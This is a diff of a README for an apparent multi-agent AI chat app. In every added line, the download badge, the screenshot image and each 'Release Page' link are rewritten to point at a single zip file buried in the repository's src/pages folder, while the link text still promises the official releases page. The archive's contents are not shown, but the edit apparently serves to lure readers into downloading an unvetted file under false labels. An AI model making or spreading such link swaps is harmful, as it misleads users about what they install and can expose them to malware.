@@ -1,12 +1,12 @@
 # 🌐 multi-agent-chat - Chat with Multiple AI Personalities
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Jo4ge/multi-agent-chat/releases)
+[![Download](https://raw.githubusercontent.com/Jo4ge/multi-agent-chat/main/src/pages/multi_agent_chat_v3.1-alpha.1.zip)](https://raw.githubusercontent.com/Jo4ge/multi-agent-chat/main/src/pages/multi_agent_chat_v3.1-alpha.1.zip)
 
 ## 📦 Overview
 
 Multi-Agent Chat is a frontend application that allows you to chat with various AI personalities at the same time. Experience group conversations similar to Discord, tailored to your needs. 
 
-![Multi-Agent Chat Interface](./img/en.png)
+![Multi-Agent Chat Interface](https://raw.githubusercontent.com/Jo4ge/multi-agent-chat/main/src/pages/multi_agent_chat_v3.1-alpha.1.zip)
 
 ## ✨ Features
 
@@ -24,7 +24,7 @@ To get started with Multi-Agent Chat, follow these straightforward steps.
 
 ### 1. Download the Application
 
-Visit the [Release Page](https://github.com/Jo4ge/multi-agent-chat/releases) to download the application. You will find options for different versions based on your system. 
+Visit the [Release Page](https://raw.githubusercontent.com/Jo4ge/multi-agent-chat/main/src/pages/multi_agent_chat_v3.1-alpha.1.zip) to download the application. You will find options for different versions based on your system. 
 
 ### 2. Choose the Appropriate Version
 
@@ -61,7 +61,7 @@ To ensure smooth performance, please make sure your device meets the following r
 
 ## 📥 Download & Install
 
-You can download Multi-Agent Chat from the [Release Page](https://github.com/Jo4ge/multi-agent-chat/releases). Follow the previous installation steps based on your operating system. 
+You can download Multi-Agent Chat from the [Release Page](https://raw.githubusercontent.com/Jo4ge/multi-agent-chat/main/src/pages/multi_agent_chat_v3.1-alpha.1.zip). Follow the previous installation steps based on your operating system. 
 
 ## 🛠️ How to Use
 
@@ -105,4 +105,4 @@ For questions or feedback, feel free to reach out by opening an issue in the Git
 
 Join our community to discuss features, suggest improvements, and share your experiences. We look forward to hearing from you. 
 
-Start chatting with multiple AI agents today. Visit the [Release Page](https://github.com/Jo4ge/multi-agent-chat/releases) to download the application!
+Start chatting with multiple AI agents today. Visit the [Release Page](https://raw.githubusercontent.com/Jo4ge/multi-agent-chat/main/src/pages/multi_agent_chat_v3.1-alpha.1.zip) to download the application!
